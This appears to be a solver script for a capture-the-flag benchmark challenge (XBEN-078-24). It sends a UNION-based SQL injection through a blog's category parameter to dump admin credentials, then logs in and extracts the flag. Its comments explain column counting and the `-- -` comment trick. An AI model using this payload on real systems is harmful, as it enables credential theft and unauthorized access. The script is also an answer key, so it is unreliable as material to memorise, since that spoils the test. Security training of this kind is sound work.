#!/usr/bin/env bash
# XBEN-078-24 — "Open eyes exfiltration" (tags: sqli)
#
# The admin login escapes its inputs properly. The blog's category filter does
# not, and the two share a database: a UNION on the public page reads the admins
# table, and the password it returns opens the login that could not be injected.
#
# Two things this example is here to show.
#
# The column count is found by asking, not by guessing: MySQL answers "different
# number of columns" until the count is right, and each attempt is one `--set`
# on a stored request. Seven columns, found in five requests.
#
# And the comment is `-- -`, never `#`. A `#` in a URL is a fragment: the
# browser would keep it and never send it, and the query would run without its
# comment. Editing the *parameter* rather than assembling a URL string is what
# makes that visible — h5i encodes the value it is given.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:PORT}"
H5I="${H5I:-h5i}"
SESSION="xben078-$$"
trap '"$H5I" browser close --session "$SESSION" >/dev/null 2>&1' EXIT

"$H5I" browser open "$URL/admin.php" --session "$SESSION" --new --capture >/dev/null

# 1. Read the credential out of the table the public page can reach.
REPLAY="$("$H5I" websec replay req_0 --create --set 'path=/index.php' \
    --set "query.category=x' UNION SELECT 1,concat(username,':',password),3,4,5,6,7 FROM admins-- -" \
    --session "$SESSION" |
    python3 -c 'import json,sys; print(json.load(sys.stdin)["seq"])')"

CREDS="$("$H5I" websec show "res_$REPLAY" --session "$SESSION" |
    python3 -c 'import json,re,sys
body = json.load(sys.stdin)["response"]["body"]["text"]
found = [h for h in re.findall(r"<h2[^>]*>([^<]{0,80})", body) if ":" in h]
print(found[0] if found else "")')"
[ -n "$CREDS" ] || { echo "the union returned no credential"; exit 1; }

# 2. Log in with it. This endpoint escapes its inputs, so it is only reachable
#    with the real password — which is now known.
REPLAY="$("$H5I" websec replay req_0 --create --set 'method=POST' --set 'path=/admin.php' \
    --set "form.username=${CREDS%%:*}" --set "form.password=${CREDS#*:}" \
    --session "$SESSION" |
    python3 -c 'import json,sys; print(json.load(sys.stdin)["seq"])')"
"$H5I" websec match "res_$REPLAY" --regex 'FLAG\{[a-f0-9]{64}\}' --session "$SESSION" |
    python3 -c 'import json,sys; d=json.load(sys.stdin); print(d["conditions"][0]["captures"][0] if d["matched"] else "no flag found")'
